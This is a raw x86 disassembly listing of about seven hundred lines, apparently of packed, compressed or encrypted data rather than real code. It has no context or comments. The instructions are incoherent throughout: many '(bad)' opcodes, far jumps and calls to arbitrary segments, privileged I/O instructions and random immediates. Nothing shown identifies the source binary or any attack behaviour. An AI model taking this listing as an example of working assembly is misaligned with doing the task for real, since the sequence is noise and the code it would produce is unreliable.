  40e859:	retf   0x9887
  40e85c:	mov    WORD PTR [ecx+0x468279a2],es
  40e862:	loope  0x40e8ab
  40e864:	or     eax,0x978dd787
  40e869:	dec    eax
  40e86a:	ror    DWORD PTR [ebp+edx*1+0x2f29de48],1
  40e871:	cwde   
  40e872:	inc    ecx
  40e873:	jecxz  0x40e8ee
  40e875:	scas   eax,DWORD PTR es:[edi]
  40e876:	mov    es,WORD PTR [ebx-0x35]
  40e879:	popa   
  40e87a:	cli    
  40e87b:	mov    cl,0x35
  40e87d:	mov    edx,0x66443573
  40e882:	loop   0x40e8bd
  40e884:	retf   0xd868
  40e887:	(bad)  
  40e889:	push   esi
  40e88a:	popf   
  40e88b:	mov    ds:0x2a9abc6a,eax
  40e890:	loopne 0x40e84f
  40e892:	pop    eax
  40e893:	retf   
  40e894:	xlat   BYTE PTR ds:[ebx]
  40e895:	push   ss
  40e896:	jno    0x40e8e9
  40e898:	ror    BYTE PTR [eax+edi*8+0x36],1
  40e89c:	cmp    cl,BYTE PTR [ebx+esi*2+0x34]
  40e8a0:	call   0xddda:0xbde5a11d
  40e8a7:	test   DWORD PTR [ecx],edx
  40e8a9:	mov    al,0xe7
  40e8ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8ac:	(bad)  
  40e8ad:	retf   0x99aa
  40e8b0:	imul   ecx,DWORD PTR [ebx-0x79],0xffffffbf
  40e8b4:	push   esi
  40e8b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8b6:	mov    dl,0x2f
  40e8b8:	jb     0x40e8b9
  40e8ba:	jne    0x40e86f
  40e8bc:	jns    0x40e8df
  40e8be:	jnp    0x40e8c0
  40e8c0:	mov    BYTE PTR [esi-0x5040c45b],ch
  40e8c6:	and    DWORD PTR [esi],edi
  40e8c8:	aad    0x8c
  40e8ca:	xchg   ecx,eax
  40e8cb:	sahf   
  40e8cc:	push   ss
  40e8cd:	push   0x16
  40e8cf:	retf   
  40e8d0:	stc    
  40e8d1:	jne    0x40e86e
  40e8d3:	jnp    0x40e888
  40e8d5:	int3   
  40e8d6:	(bad)  
  40e8d7:	xor    DWORD PTR [edi+0x150024c9],0xfffffff5
  40e8de:	pop    ebp
  40e8df:	dec    edx
  40e8e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8e1:	cli    
  40e8e2:	mov    al,ds:0x4f17b4b1
  40e8e7:	dec    eax
  40e8e8:	xchg   esp,eax
  40e8e9:	cmp    BYTE PTR [edx+0x5d45c5d3],al
  40e8ef:	cmp    eax,0x2e2d3b5f
  40e8f4:	mov    fs,eax
  40e8f6:	sahf   
  40e8f7:	mov    esp,0x51518371
  40e8fc:	sar    bh,cl
  40e8fe:	mov    ds:0xaf45b271,eax
  40e903:	lock xchg eax,esp
  40e906:	ret    0xa306
  40e909:	fsubr  st,st(1)
  40e90b:	dec    ecx
  40e90c:	outs   dx,BYTE PTR ds:[esi]
  40e90d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e90e:	sbb    dl,BYTE PTR [ebp+0x27a2eb55]
  40e914:	sti    
  40e915:	mov    ah,0xd3
  40e917:	mov    bh,0x94
  40e919:	scas   eax,DWORD PTR es:[edi]
  40e91a:	cmp    al,BYTE PTR [edi+0x46]
  40e91d:	adc    eax,0x8549597a
  40e922:	imul   esp,DWORD PTR [edx-0x4b9c8ba2],0xd61f3e34
  40e92c:	mov    eax,ds:0x5ee11098
  40e931:	cli    
  40e932:	ds push ecx
  40e934:	mov    al,ds:0xc410986f
  40e939:	cld    
  40e93a:	lds    ecx,FWORD PTR ds:0x3700ea66
  40e940:	sar    dh,cl
  40e942:	mov    eax,ds:0x8eb5c56d
  40e947:	pop    eax
  40e948:	sbb    edx,edi
  40e94a:	stos   DWORD PTR es:[edi],eax
  40e94b:	push   0xffffffee
  40e94d:	mul    DWORD PTR [eax+esi*8+0x48]
  40e951:	xrelease mov DWORD PTR [ecx-0x724228b3],esi
  40e958:	mov    eax,es
  40e95a:	lods   eax,DWORD PTR ds:[esi]
  40e95b:	mov    ds:0xd6d67cc9,eax
  40e960:	or     DWORD PTR [edx-0x1a],esi
  40e963:	(bad)  
  40e964:	daa    
  40e965:	jp     0x40e915
  40e967:	cmp    al,0xa5
  40e969:	cmp    BYTE PTR [edx],dh
  40e96b:	mov    ds:0xf737ef72,eax
  40e970:	sahf   
  40e971:	out    dx,eax
  40e972:	(bad)  
  40e974:	and    bl,ch
  40e976:	ret    0xe7a1
  40e979:	sbb    BYTE PTR [ecx],al
  40e97b:	stos   BYTE PTR es:[edi],al
  40e97c:	dec    ecx
  40e97d:	aad    0xea
  40e97f:	sub    BYTE PTR [edi+0x288a0cb9],0x71
  40e986:	mov    esp,0x170df51c
  40e98b:	add    BYTE PTR [edi],cl
  40e98d:	push   edi
  40e98e:	aam    0x14
  40e990:	iret   
  40e991:	sahf   
  40e992:	jbe    0x40e97e
  40e994:	fsub   QWORD PTR [edi]
  40e996:	ins    BYTE PTR es:[edi],dx
  40e997:	push   0xef04b952
  40e99c:	and    al,0xcc
  40e99e:	jo     0x40e9d7
  40e9a0:	jg     0x40e97f
  40e9a2:	mov    edx,0x2a343003
  40e9a7:	into   
  40e9a8:	inc    eax
  40e9a9:	mov    bl,0x10
  40e9ab:	icebp  
  40e9ac:	cwde   
  40e9ad:	fwait
  40e9ae:	sub    edx,DWORD PTR [ebx+0x7f]
  40e9b1:	sbb    DWORD PTR [ebp-0x4c6a1bd3],esp
  40e9b7:	ret    0xf4af
  40e9ba:	lock lods al,BYTE PTR ds:[esi]
  40e9bc:	mov    dl,0x33
  40e9be:	add    eax,DWORD PTR [eax-0x104bb7d2]
  40e9c4:	pop    ecx
  40e9c5:	push   ecx
  40e9c6:	inc    esp
  40e9c7:	fwait
  40e9c8:	adc    BYTE PTR [ebp+0x367dc385],bh
  40e9ce:	ds jnp 0x40ea22
  40e9d1:	mov    al,0x8b
  40e9d3:	xchg   BYTE PTR [eax+0x7c0af67c],dh
  40e9d9:	pop    ebx
  40e9da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9db:	dec    ecx
  40e9dc:	test   al,0x23
  40e9de:	popf   
  40e9df:	jmp    0x40e9b2
  40e9e1:	cmp    cl,BYTE PTR [esi]
  40e9e3:	xlat   BYTE PTR ds:[ebx]
  40e9e4:	dec    edi
  40e9e5:	mov    ah,BYTE PTR [eax]
  40e9e7:	dec    edi
  40e9e8:	jnp    0x40e9c4
  40e9ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9eb:	add    al,0xb8
  40e9ed:	push   eax
  40e9ee:	inc    esi
  40e9ef:	push   edi
  40e9f0:	imul   eax,ecx,0x331758be
  40e9f6:	call   0x7f6aac56
  40e9fb:	xchg   DWORD PTR [esi-0x2e],eax
  40e9fe:	push   cs
  40e9ff:	leave  
  40ea00:	cmp    DWORD PTR [esi+0x5d43c9f6],eax
  40ea06:	iret   
  40ea07:	mov    ah,0x4a
  40ea09:	mov    bl,0xd6
  40ea0b:	push   edi
  40ea0c:	push   cs
  40ea0d:	sub    esp,ebp
  40ea0f:	cmp    al,0x40
  40ea11:	adc    ebx,DWORD PTR [ebx]
  40ea13:	pop    esi
  40ea14:	xchg   esi,eax
  40ea15:	test   eax,0xb7676154
  40ea1a:	jno    0x40ea7d
  40ea1c:	daa    
  40ea1d:	jne    0x40ea54
  40ea1f:	push   edx
  40ea20:	(bad)  
  40ea21:	adc    BYTE PTR ds:[edi],0xf4
  40ea25:	fcmovnbe st,st(5)
  40ea27:	movnti DWORD PTR [ebp-0x577a5405],eax
  40ea2e:	and    BYTE PTR [esp+esi*8-0x1c],ch
  40ea32:	dec    edi
  40ea33:	addr16 mov edi,0xbb4fdc73
  40ea39:	das    
  40ea3a:	or     ch,BYTE PTR [eax-0x89e256a]
  40ea40:	call   FWORD PTR [edi+0x8ac206b]
  40ea46:	mov    ebx,0xcefc84ab
  40ea4b:	push   ebx
  40ea4c:	push   0xffffff9f
  40ea4e:	imul   eax,DWORD PTR [edx],0x592419d3
  40ea54:	repnz scas eax,DWORD PTR es:[edi]
  40ea56:	jg     0x40ea4b
  40ea58:	or     ebx,DWORD PTR [edx-0x464bb164]
  40ea5e:	pop    esi
  40ea5f:	(bad)  
  40ea61:	cld    
  40ea62:	xor    DWORD PTR ds:0x400a34a,edx
  40ea68:	push   cs
  40ea69:	adc    edx,DWORD PTR [ebx]
  40ea6b:	lods   al,BYTE PTR ds:[esi]
  40ea6c:	add    esp,ebx
  40ea6e:	sub    ebx,DWORD PTR [eax]
  40ea70:	fdiv   DWORD PTR [ebp+0x74]
  40ea73:	test   BYTE PTR [edx-0x71],dh
  40ea76:	pop    esi
  40ea77:	mov    esp,0xb3a1235c
  40ea7c:	push   ebx
  40ea7d:	pushf  
  40ea7e:	add    DWORD PTR [ecx-0x8],edx
  40ea81:	(bad)  
  40ea82:	pushf  
  40ea83:	jns    0x9d6cbf29
  40ea89:	gs push edi
  40ea8b:	xor    ebx,esp
  40ea8d:	add    BYTE PTR [ecx+0x49],ch
  40ea90:	imul   ebx
  40ea92:	push   ds
  40ea93:	add    eax,DWORD PTR [esi-0x63d739d6]
  40ea99:	cmp    dh,BYTE PTR [edx+0x66]
  40ea9c:	call   FWORD PTR [eax+0x6f]
  40ea9f:	lods   al,BYTE PTR ds:[esi]
  40eaa0:	out    0xf7,eax
  40eaa2:	xor    BYTE PTR [edi],dh
  40eaa4:	test   DWORD PTR [eax-0x67a67961],eax
  40eaaa:	fwait
  40eaab:	sahf   
  40eaac:	push   ebp
  40eaad:	mov    dh,0xd0
  40eaaf:	(bad)  
  40eab0:	ins    BYTE PTR es:[edi],dx
  40eab1:	or     eax,0x64cdf33a
  40eab6:	xchg   ebp,eax
  40eab7:	repnz mov edx,0xb00cdca5
  40eabd:	xor    al,0xf3
  40eabf:	gs xor esi,esp
  40eac2:	imul   ecx,ebp,0xffffffc1
  40eac5:	sub    dl,BYTE PTR [edx+0x34]
  40eac8:	dec    edi
  40eac9:	mov    BYTE PTR [ebx-0x2d],dl
  40eacc:	addr16 enter 0xdc3c,0xf2
  40ead1:	in     eax,0x22
  40ead3:	xchg   BYTE PTR [eax-0x4d7576f6],al
  40ead9:	mov    dh,0xaf
  40eadb:	hlt    
  40eadc:	es mov dl,0xdd
  40eadf:	sub    ah,BYTE PTR [ebp-0x7d]
  40eae2:	pop    ds
  40eae3:	call   0xfd61:0x4350ff52
  40eaea:	jle    0x40ead8
  40eaec:	xchg   ebx,eax
  40eaed:	add    al,0x6f
  40eaef:	out    dx,eax
  40eaf0:	and    BYTE PTR [esi+0x60683e6a],bl
  40eaf6:	ret    0x2039
  40eaf9:	int    0x9d
  40eafb:	dec    eax
  40eafc:	jmp    0x40ea82
  40eafe:	lds    ebp,FWORD PTR ds:0x172d7dc4
  40eb04:	dec    edx
  40eb05:	jbe    0x40eb6c
  40eb07:	retf   
  40eb08:	sub    ebx,ecx
  40eb0a:	ins    DWORD PTR es:[edi],dx
  40eb0b:	pop    edi
  40eb0c:	fnstcw WORD PTR [edi+ebx*4+0x5a1edc6c]
  40eb13:	jmp    0xde69:0xb554f578
  40eb1a:	pop    esp
  40eb1b:	(bad)  
  40eb1c:	out    0xce,al
  40eb1e:	test   al,0x5c
  40eb20:	push   ecx
  40eb21:	sbb    DWORD PTR [eax+eax*2+0x7e07f186],edi
  40eb28:	mov    esi,0x6ecd275f
  40eb2d:	jle    0x40eb22
  40eb2f:	aam    0xaf
  40eb31:	ss fs aaa 
  40eb34:	mov    ch,0xa3
  40eb36:	and    DWORD PTR [esi-0x14577ee7],edi
  40eb3c:	adc    esi,ecx
  40eb3e:	sub    ecx,DWORD PTR [edi+0x3d40223]
  40eb44:	jmp    0x92b6:0xd8e669de
  40eb4b:	xchg   ebx,eax
  40eb4c:	inc    ecx
  40eb4d:	in     eax,dx
  40eb4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb4f:	stos   DWORD PTR es:[edi],eax
  40eb50:	rol    DWORD PTR [ebx],cl
  40eb52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb53:	push   ebp
  40eb54:	pop    ecx
  40eb55:	in     eax,0xd4
  40eb57:	pop    ebp
  40eb58:	push   edi
  40eb59:	icebp  
  40eb5a:	fs daa 
  40eb5c:	push   ds
  40eb5d:	xor    BYTE PTR [eax],ch
  40eb5f:	je     0x40ebac
  40eb61:	test   eax,0xa311a04a
  40eb66:	xchg   ebp,eax
  40eb67:	mov    ebx,0x42365f2e
  40eb6c:	jmp    0x40eb87
  40eb6e:	dec    edi
  40eb6f:	xor    eax,DWORD PTR [ecx-0x7b1cf900]
  40eb75:	adc    DWORD PTR [esi+edx*1],0x6d
  40eb79:	xchg   DWORD PTR [ecx+0x59],ecx
  40eb7c:	lahf   
  40eb7d:	sbb    DWORD PTR [eax],esi
  40eb7f:	or     DWORD PTR [esi-0x5ed5f0c7],ebp
  40eb85:	out    dx,eax
  40eb86:	imul   esi,DWORD PTR [ecx-0x56],0x38197eef
  40eb8d:	js     0x40eb7f
  40eb8f:	aaa    
  40eb90:	xor    BYTE PTR [ebp-0x605a3c1e],bl
  40eb96:	xor    ch,0x9a
  40eb99:	sub    BYTE PTR [ebp+0x31fb0ef9],ch
  40eb9f:	mov    esp,0xd74df842
  40eba4:	or     esp,DWORD PTR [esi]
  40eba6:	pand   mm1,QWORD PTR [edx+0x1d]
  40ebaa:	imul   ecx,DWORD PTR [edx-0x72],0x6e
  40ebae:	mov    es:0x92d78e62,eax
  40ebb4:	cwde   
  40ebb5:	or     DWORD PTR [eax+ebp*1-0x80],esi
  40ebb9:	loopne 0x40ec2d
  40ebbb:	cdq    
  40ebbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebbd:	(bad)  
  40ebbe:	retf   0x8e29
  40ebc1:	popf   
  40ebc2:	cs sbb ebx,edx
  40ebc5:	imul   edi,DWORD PTR [eax+0x545bd1c2],0x36
  40ebcc:	dec    ecx
  40ebcd:	xchg   ecx,eax
  40ebce:	or     DWORD PTR [edi],esp
  40ebd0:	cmc    
  40ebd1:	arpl   WORD PTR [esi-0x77],bx
  40ebd4:	imul   ebx,DWORD PTR [edx+esi*8+0x464415d9],0x4c
  40ebdc:	enter  0x95cc,0xbc
  40ebe0:	lds    ecx,FWORD PTR [eax+0xdf7540c]
  40ebe6:	and    esp,ecx
  40ebe8:	sub    eax,0x63478971
  40ebed:	inc    edx
  40ebee:	or     al,0x3d
  40ebf0:	stos   BYTE PTR es:[edi],al
  40ebf1:	or     edi,edi
  40ebf3:	test   DWORD PTR [ecx-0x6d417abe],edi
  40ebf9:	mov    ebx,eax
  40ebfb:	cmp    al,0x57
  40ebfd:	push   ecx
  40ebfe:	scas   al,BYTE PTR es:[edi]
  40ebff:	adc    eax,0xbcf54104
  40ec04:	shl    BYTE PTR [edi],1
  40ec06:	xlat   BYTE PTR ds:[ebx]
  40ec07:	jl     0x40ebd3
  40ec09:	pop    ds
  40ec0a:	dec    ecx
  40ec0b:	jecxz  0x40ec7e
  40ec0d:	jnp    0x40ec1e
  40ec0f:	and    eax,0x6f798d4b
  40ec14:	call   0x845fed69
  40ec19:	xor    edi,DWORD PTR [eax+0x3510cf2]
  40ec1f:	push   ebx
  40ec20:	mov    al,0x54
  40ec22:	mov    ds:0x5c152514,al
  40ec27:	shl    DWORD PTR [esi],0xc2
  40ec2a:	mov    cl,0x5e
  40ec2c:	retf   
  40ec2d:	gs mov edi,esp
  40ec30:	lea    edx,[esi+0x57]
  40ec33:	mov    al,dl
  40ec35:	repz mov gs,WORD PTR [edx]
  40ec38:	leave  
  40ec39:	je     0x40ec0f
  40ec3b:	add    al,bh
  40ec3d:	add    esp,DWORD PTR [ebp+esi*4+0x1c]
  40ec41:	sub    eax,0x4bd5f1b5
  40ec46:	or     eax,0x2bc7ee2
  40ec4b:	int3   
  40ec4c:	bnd jp 0x40ec69
  40ec4f:	fsub   st,st(4)
  40ec51:	sub    BYTE PTR [ebp-0x655a698a],bh
  40ec57:	mov    dh,0x52
  40ec59:	sbb    esi,DWORD PTR [esi]
  40ec5b:	std    
  40ec5c:	push   esp
  40ec5d:	mov    eax,ds:0xb32dae98
  40ec62:	mov    ch,0x95
  40ec64:	sbb    al,0x97
  40ec66:	fwait
  40ec67:	mov    ah,0xeb
  40ec69:	xor    ah,BYTE PTR [ebp+0x5ecfd515]
  40ec6f:	lds    ebx,FWORD PTR [esi-0x1e128af]
  40ec75:	inc    edi
  40ec76:	pop    esp
  40ec77:	jns    0x40ecda
  40ec79:	cmp    BYTE PTR [ebp+0x11479913],bh
  40ec7f:	jge    0x40ec0f
  40ec81:	sbb    esi,DWORD PTR [esi+edx*2]
  40ec84:	mov    esp,0x1b433c16
  40ec89:	clc    
  40ec8a:	lods   al,BYTE PTR ds:[esi]
  40ec8b:	bound  esp,QWORD PTR [edi-0x7d372f24]
  40ec91:	or     bl,bl
  40ec93:	fs loopne 0x40ec30
  40ec96:	mov    eax,0xb160ff2f
  40ec9b:	popf   
  40ec9c:	pop    ebx
  40ec9d:	sub    esp,eax
  40ec9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eca0:	and    bl,BYTE PTR [eax+ebx*1-0x27a0a3a7]
  40eca7:	xor    edx,eax
  40eca9:	stc    
  40ecaa:	sub    eax,0xf083b13b
  40ecaf:	sub    BYTE PTR [edi-0xa57fa92],0x6a
  40ecb6:	push   ds
  40ecb7:	loopne 0x40ec41
  40ecb9:	inc    ebp
  40ecba:	jae    0x40ecd0
  40ecbc:	sub    edx,esi
  40ecbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecc0:	xor    BYTE PTR [ebp-0x35],cl
  40ecc3:	rol    bh,0xf3
  40ecc6:	sub    bl,BYTE PTR [ebx-0x5ef5a2d9]
  40eccc:	rcl    DWORD PTR [edx-0x42],1
  40eccf:	push   edi
  40ecd0:	stos   DWORD PTR es:[edi],eax
  40ecd1:	(bad)  
  40ecd2:	mov    cl,0x2d
  40ecd4:	xor    eax,0xaa151609
  40ecd9:	cld    
  40ecda:	scas   eax,DWORD PTR es:[edi]
  40ecdb:	sbb    ch,BYTE PTR [ecx-0x45bf3f24]
  40ece1:	and    dh,bh
  40ece3:	shl    BYTE PTR [esi-0x20],1
  40ece6:	out    dx,al
  40ece7:	(bad)  [ebx-0x7]
  40ecea:	outs   dx,BYTE PTR ds:[esi]
  40eceb:	sti    
  40ecec:	out    dx,eax
  40eced:	in     eax,0x1f
  40ecef:	mov    ecx,0x8d9b37a7
  40ecf4:	mov    ds,ebx
  40ecf6:	pushf  
  40ecf7:	inc    ecx
  40ecf8:	ins    DWORD PTR es:[edi],dx
  40ecf9:	les    edi,FWORD PTR [ecx-0x73913122]
  40ecff:	pop    ss
  40ed00:	jge    0x40ed27
  40ed02:	inc    esi
  40ed03:	sbb    DWORD PTR [ebx+0x175649df],edx
  40ed09:	xor    BYTE PTR [ecx-0x664dba52],0xa3
  40ed10:	and    BYTE PTR [ecx],dl
  40ed12:	cli    
  40ed13:	push   ebx
  40ed14:	mov    BYTE PTR [esi+eiz*8],0x3a
  40ed18:	and    DWORD PTR [ecx-0x3b91cc6d],0x7e2ed7c1
  40ed22:	fild   WORD PTR [ecx]
  40ed24:	mov    eax,0x29cd643f
  40ed29:	inc    edx
  40ed2a:	outs   dx,BYTE PTR ds:[esi]
  40ed2b:	xchg   DWORD PTR [edx],ebx
  40ed2d:	shl    ebx,1
  40ed2f:	scas   eax,DWORD PTR es:[edi]
  40ed30:	pop    eax
  40ed31:	outs   dx,DWORD PTR ds:[esi]
  40ed32:	pop    ds
  40ed33:	fs es call 0x6044:0xea56271c
  40ed3c:	dec    esp
  40ed3d:	jbe    0x40ed22
  40ed3f:	or     BYTE PTR [eax+0x410bf34c],al
  40ed45:	or     DWORD PTR [edi-0x7d],edx
  40ed48:	or     DWORD PTR [ebx],esi
  40ed4a:	sub    ebx,0xffffff96
  40ed4d:	addr16 leave 
  40ed4f:	leave  
  40ed50:	mov    dh,0x96
  40ed52:	and    ah,BYTE PTR [edx+ebp*2+0x4b]
  40ed56:	ins    BYTE PTR es:[edi],dx
  40ed57:	dec    edi
  40ed58:	or     DWORD PTR [ebp+ecx*2-0x4b],ebx
  40ed5c:	mov    eax,ds:0xcbd9252c
  40ed61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed62:	outs   dx,DWORD PTR ds:[esi]
  40ed63:	loop   0x40ed84
  40ed65:	sbb    eax,DWORD PTR [esi-0xbf6f6b5]
  40ed6b:	sub    eax,esi
  40ed6d:	mul    DWORD PTR [edx+0x32]
  40ed70:	sti    
  40ed71:	push   0x58
  40ed73:	mov    WORD PTR [eax],?
  40ed75:	mov    ds:0xb466cd57,eax
  40ed7a:	mov    WORD PTR [eax-0x7d],?
  40ed7d:	xchg   esp,eax
  40ed7e:	(bad)  
  40ed7f:	and    eax,0xb97a40bb
  40ed84:	aad    0x66
  40ed86:	jns    0x40edb2
  40ed88:	sti    
  40ed89:	sbb    bl,BYTE PTR [ebp-0x7297265e]
  40ed8f:	mov    cl,BYTE PTR [eax+edi*1]
  40ed92:	loope  0x40ed1f
  40ed94:	mov    ebx,0xdb3da5d8
  40ed99:	mov    ds:0x1a5baf94,al
  40ed9e:	ret    0x317d
  40eda1:	lods   al,BYTE PTR ds:[esi]
  40eda2:	jno    0x40ed57
  40eda4:	mov    eax,ds:0x26e68560
  40eda9:	sbb    eax,0xc481c4e6
  40edae:	fistp  WORD PTR [ebp+0x444f779c]
  40edb4:	cmp    BYTE PTR [ebx+0x4d67c847],ah
  40edba:	jecxz  0x40ede0
  40edbc:	adc    eax,0xef544ab5
  40edc1:	ds shl cl,1
  40edc4:	adc    ch,BYTE PTR [ebx+0x56]
  40edc7:	add    BYTE PTR [ecx-0x69],bl
  40edca:	fisttp QWORD PTR [ebx+0x46]
  40edcd:	push   ebx
  40edce:	hlt    
  40edcf:	jg     0x40ee02
  40edd1:	bound  eax,QWORD PTR [esi+0x49]
  40edd4:	aas    
  40edd5:	xchg   BYTE PTR [edi],ah
  40edd7:	test   DWORD PTR [eax-0x2a0963b4],edi
  40eddd:	es loop 0x40ed96
  40ede0:	mov    bh,0xa3
  40ede2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ede3:	inc    edi
  40ede4:	push   esi
  40ede5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ede6:	shr    DWORD PTR [ebx-0x3f],cl
  40ede9:	or     BYTE PTR [edi+0x22e713bc],dh
  40edef:	mov    ds:0x5478a559,al
  40edf4:	pusha  
  40edf5:	ret    0x161b
  40edf8:	nop
  40edf9:	pop    edx
  40edfa:	jo     0x40eda7
  40edfc:	out    dx,al
  40edfd:	push   es
  40edfe:	pop    edi
  40edff:	addr16 mov bh,0xe6
  40ee02:	mov    dh,bh
  40ee04:	imul   esp,DWORD PTR [esi],0x4b
  40ee07:	mov    eax,0xc9ce405b
  40ee0c:	xchg   esp,eax
  40ee0d:	inc    eax
  40ee0e:	lahf   
  40ee0f:	or     ebp,eax
  40ee11:	fld    DWORD PTR [ecx-0x3eec824e]
  40ee17:	xchg   ebx,eax
  40ee18:	fcomp  DWORD PTR [ebp+ebp*2+0x7b]
  40ee1c:	add    DWORD PTR [edi+0x253adab2],0xffffffd8
  40ee23:	aad    0x9f
  40ee25:	mov    edi,0x3759aad8
  40ee2a:	push   ebx
  40ee2b:	iret   
  40ee2c:	sar    DWORD PTR [edx+0x17af4b6b],cl
  40ee32:	loopne 0x40eeae
  40ee34:	jb     0x40ee56
  40ee36:	xchg   ebp,eax
  40ee37:	fidivr DWORD PTR [esi+0x54794c8]
  40ee3d:	cmp    ebx,DWORD PTR [ebx+0x6c7636ba]
  40ee43:	retf   
  40ee44:	dec    ecx
  40ee45:	sub    eax,0xe5825e98
  40ee4a:	sub    al,0xd8
  40ee4c:	inc    esp
  40ee4d:	mov    eax,ds:0x799ed5ae
  40ee52:	sub    al,0x6b
  40ee54:	xchg   BYTE PTR [edx-0x2a],cl
  40ee57:	jp     0x40eed4
  40ee59:	sti    
  40ee5a:	inc    edx
  40ee5b:	pop    eax
  40ee5c:	cmp    ch,BYTE PTR [ecx]
  40ee5e:	scas   al,BYTE PTR es:[edi]
  40ee5f:	xchg   ecx,eax
  40ee60:	(bad)  [ecx-0x45]
  40ee63:	mov    esi,cs
  40ee65:	out    0xe9,eax
  40ee67:	(bad)  
  40ee68:	retf   
  40ee69:	adc    al,BYTE PTR fs:[eax]
  40ee6c:	jnp    0x40eead
  40ee6e:	mov    dl,0x6a
  40ee70:	stos   BYTE PTR es:[edi],al
  40ee71:	les    esp,FWORD PTR gs:[ebx-0x49e676ee]
  40ee78:	push   es
  40ee79:	xor    ebp,ebx
  40ee7b:	jmp    0x40ee58
  40ee7d:	imul   edx,esi,0xffffffb6
  40ee80:	sahf   
  40ee81:	inc    esp
  40ee82:	int    0x7f
  40ee84:	jae    0x40ee33
  40ee86:	pop    edi
  40ee87:	xchg   ebp,eax
  40ee88:	cmp    cl,BYTE PTR [ebx]
  40ee8a:	dec    ebp
  40ee8b:	and    esp,DWORD PTR [edi-0x269efd19]
  40ee91:	sub    DWORD PTR [ebp+0x57296cda],esp
  40ee97:	xor    DWORD PTR [ebx],ebp
  40ee99:	xor    dl,0xd9
  40ee9c:	mov    BYTE PTR [esi],0x46
  40ee9f:	jb     0x40eecd
  40eea1:	imul   edi,ebx,0x3f556d36
  40eea7:	mov    al,0xf1
  40eea9:	xchg   edi,eax
  40eeaa:	popa   
  40eeab:	add    DWORD PTR [ecx+0x76],0x10
  40eeaf:	mov    ds:0x3f7284bb,al
  40eeb4:	xchg   BYTE PTR [ecx+0x1186a649],dl
  40eeba:	hlt    
  40eebb:	stos   BYTE PTR es:[edi],al
  40eebc:	stos   DWORD PTR es:[edi],eax
  40eebd:	xchg   esi,eax
  40eebe:	jo     0x40ee65
  40eec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eec1:	fisubr WORD PTR [ebx-0x5d05cb9b]
  40eec7:	out    0xc5,eax
  40eec9:	xlat   BYTE PTR ds:[ebx]
  40eeca:	mov    ds:0x3c3bbc92,al
  40eecf:	int    0xea
  40eed1:	push   0xbeedba4b
  40eed6:	fsubr  DWORD PTR [edx-0x4b0231cc]
  40eedc:	(bad)  
  40eedd:	stos   DWORD PTR es:[edi],eax
  40eede:	push   0xffffffb8
  40eee0:	scas   eax,DWORD PTR es:[edi]
  40eee1:	arpl   WORD PTR [edi+0x12],di
  40eee4:	inc    esi
  40eee5:	daa    
  40eee6:	mov    ds:0x8d423f52,al
  40eeeb:	add    eax,0x92c2dcea
  40eef0:	xor    cl,BYTE PTR [eax+ecx*4]
  40eef3:	adc    al,0xdd
  40eef5:	scas   al,BYTE PTR es:[edi]
  40eef6:	int    0x6d
  40eef8:	jne    0x40eeaf
  40eefa:	out    0x9,al
  40eefc:	aad    0x5f
  40eefe:	popf   
  40eeff:	popf   
  40ef00:	sbb    eax,0xb10eaa55
  40ef05:	aaa    
  40ef06:	call   0xd9b8:0x4abdfc4
  40ef0d:	imul   eax,DWORD PTR [ecx+0x2a38cc80],0x43748ddf
  40ef17:	jbe    0x40ef67
  40ef19:	mov    ch,BYTE PTR [edx]
  40ef1b:	in     al,0xef
  40ef1d:	adc    ecx,DWORD PTR [ecx+0xc21ec0]
  40ef23:	ins    DWORD PTR es:[edi],dx
  40ef24:	addr16 xchg edx,eax
  40ef26:	loop   0x40ef88
  40ef28:	pop    ds
  40ef29:	jp     0x40ef19
  40ef2b:	scas   al,BYTE PTR es:[edi]
  40ef2c:	test   esp,ebx
  40ef2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef2f:	mov    esi,fs
  40ef31:	lods   al,BYTE PTR ds:[esi]
  40ef32:	std    
  40ef33:	and    eax,0xa0a5fb18
  40ef38:	jp     0x40eec3
  40ef3a:	adc    al,0x84
  40ef3c:	fbstp  TBYTE PTR cs:[eax]
  40ef3f:	scas   eax,DWORD PTR es:[edi]
  40ef40:	jo     0x40ef59
  40ef42:	inc    ebx
  40ef43:	jmp    0x40eedc
  40ef45:	adc    al,0xec
  40ef47:	mov    ah,0x88
  40ef49:	rcr    DWORD PTR [esp+ebx*8],0x54
  40ef4d:	dec    esp
  40ef4e:	jl     0x40eef7
  40ef50:	pop    es
  40ef51:	mov    edi,0x7fa8e554
  40ef56:	jmp    0x1d98:0x70a0461e
  40ef5d:	dec    eax
  40ef5e:	lock xchg ecx,edx
  40ef61:	sbb    al,ch
  40ef63:	mov    ebp,ds
  40ef65:	inc    eax
  40ef66:	lods   eax,DWORD PTR ds:[esi]
  40ef67:	test   BYTE PTR [edx],bh
  40ef69:	lahf   
  40ef6a:	adc    al,0x4e
  40ef6c:	mov    dh,0xf3
  40ef6e:	mov    eax,0x5c29b5eb
  40ef73:	ins    BYTE PTR es:[edi],dx
  40ef74:	jp     0x40ef43
  40ef76:	das    
  40ef77:	int3   
  40ef78:	push   esp
  40ef79:	jl     0x40ef9e
  40ef7b:	xor    eax,0x90466c83
  40ef80:	jns    0x40ef31
  40ef82:	mov    bh,0x63
  40ef84:	sbb    eax,0x2752a419
  40ef89:	cmp    DWORD PTR [ebx+0x4f7714d8],esp
  40ef8f:	xchg   ecx,eax
  40ef90:	out    0xb3,al
  40ef92:	aaa    
  40ef93:	dec    ebp
  40ef94:	idiv   DWORD PTR ds:0xad47e1a6
  40ef9a:	out    dx,al
